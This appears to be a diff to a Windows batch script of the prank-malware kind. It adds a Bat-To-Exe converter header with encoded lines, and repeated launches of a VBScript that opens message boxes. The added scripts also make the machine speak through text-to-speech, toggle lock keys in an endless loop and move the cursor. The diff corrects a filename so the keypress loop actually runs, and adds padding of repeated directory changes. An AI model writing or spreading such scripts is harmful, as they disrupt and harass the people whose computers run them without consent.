@@ -1,3 +1,36 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFC5naTa+GGS5E7gZ5vzo08uVoUUUQu0sOK3azvSHLvYW5FHlcZk+6lxxrsIeGQhkLBOpaw01+T8W4TTSYZ/P5wm5HRDfsUhnSzQj1zrViCh1adBn+g==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZk0aHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsFAlLMbCXqZg==
+::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
+::eg0/rx1wNQPfEVWB+kM9LVsJDCKpFVmPNdU=
+::fBEirQZwNQPfEVWB+kM9LVsJDFHWMjzrZg==
+::cRolqwZ3JBvQF1fEqQI2IxJGWRfCPnL6U+ESv7mb
+::dhA7uBVwLU+EWAzQ+hVhSA==
+::YQ03rBFzNR3SWATEoRY+f0o0
+::dhAmsQZ3MwfNWATE2mweSA==
+::ZQ0/vhVqMQ3MEVWAtB9wfU9aG1Xi
+::Zg8zqx1/OA3MEVWAtB9wfU9aG1Xi
+::dhA7pRFwIByZRRnRoExneXs=
+::Zh4grVQjdCyDJGyX8VAjFC5naTa+GGS5E7gZ5vzo08uVoUUUQu0sOK3azvSHLvYW5FHlcZk+6lxxrsIeGQhkWDmdZx0huiBHrmHl
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
 mode 30 , 01
 powershell -window minimized -command "" 
@@ -6,6 +39,13 @@ echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+start
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start hhhh.vbs 
+start
+start
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -14,12 +54,10 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+start
 start hhhh.vbs 
 start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
+start
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -153,6 +191,20 @@ echo Dim speaks, speech >> n.vbs
 echo speaks="jajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajaja" >> n.vbs
 echo Set speech=CreateObject("sapi.spvoice") >> n.vbs
 echo speech.Speak speaks >> n.vbs
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
 echo Set wshShell =wscript.CreateObject("WScript.Shell") >> kbm.vbs
 echo do >> kbm.vbs
 echo wscript.sleep 100 >> kbm.vbs
@@ -161,7 +213,21 @@ echo wshshell.sendkeys "{NUMLOCK}" >> kbm.vbs
 echo wshshell.sendkeys "{SCROLLLOCK}" >> kbm.vbs
 echo loop >> kbm.vbs
 cd C:\Users\%username%\Desktop
-start kmb.vbs
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+cd C:\Users\%username%\Desktop
+start kbm.vbs
 cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
